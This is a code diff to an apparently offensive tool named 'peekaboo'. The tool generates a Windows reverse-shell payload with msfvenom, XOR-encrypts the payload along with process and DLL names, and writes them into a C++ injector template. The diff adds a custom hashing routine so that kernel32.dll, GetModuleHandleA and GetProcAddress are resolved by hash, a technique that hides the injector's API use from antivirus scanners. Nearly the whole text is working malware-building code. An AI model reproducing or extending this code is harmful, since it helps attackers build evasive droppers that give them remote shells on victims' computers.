@@ -58,6 +58,13 @@ class PeekabooEncryptor():
         length = random.randint(16, 32)
         return ''.join(random.choice(string.ascii_letters) for i in range(length))
 
+class PeekabooHasher():
+    def hashing(self, data):
+        hash = 0x35
+        for i in range(0, len(data)):
+            hash += ord(data[i]) + (hash << 1)
+        return hash
+
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
     msfv = "msfvenom -p windows/x64/shell_reverse_tcp"
@@ -88,6 +95,7 @@ def run_peekaboo(host, port, proc_name, mode):
     print (Colors.BLUE + banner + Colors.ENDC)
     generate_payload(host, port)
     encryptor = PeekabooEncryptor()
+    hasher = PeekabooHasher()
     print (Colors.BLUE + "read payload..." + Colors.ENDC)
     plaintext = open("/tmp/hack.bin", "rb").read()
     # plaintext = open("./meow.bin", "rb").read()
@@ -125,7 +133,11 @@ def run_peekaboo(host, port, proc_name, mode):
     ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
     ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
     ciphertext_k32, k32_key = encryptor.xor_encrypt(k32_name, encryptor.dll_key())
-    ciphertext_ntd, ntd_key = encryptor.xor_encrypt(ntdll_name, encryptor.dll_key()) 
+    ciphertext_ntd, ntd_key = encryptor.xor_encrypt(ntdll_name, encryptor.dll_key())
+
+    kernel32_hash = hasher.hashing("kernel32.dll")
+    getmodulehandle_hash = hasher.hashing("GetModuleHandleA")
+    getprocaddress_hash = hasher.hashing("GetProcAddress")
 
     tmp = open("peekaboo_nt.cpp", "rt")
     data = tmp.read()
@@ -161,6 +173,11 @@ def run_peekaboo(host, port, proc_name, mode):
     data = data.replace('char ntd_key[] = "";', 'char ntd_key[] = "' + ntd_key + '";')
     data = data.replace('XOR(', f_xor + "(")
     data = data.replace("findMyProc(", f_ftt + "(")
+
+    print (Colors.BLUE + "calculating win API hashes..." + Colors.ENDC)
+    data = data.replace('#define KERNEL32_HASH 0x00000000', '#define KERNEL32_HASH ' + str(kernel32_hash))
+    data = data.replace('#define GETMODULEHANDLE_HASH 0x00000000', '#define GETMODULEHANDLE_HASH ' + str(getmodulehandle_hash))
+    data = data.replace('#define GETPROCADDRESS_HASH 0x00000000', '#define GETPROCADDRESS_HASH ' + str(getprocaddress_hash))
 
     if mode == "console":
         data = data.replace("int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {", "int main(void) {")
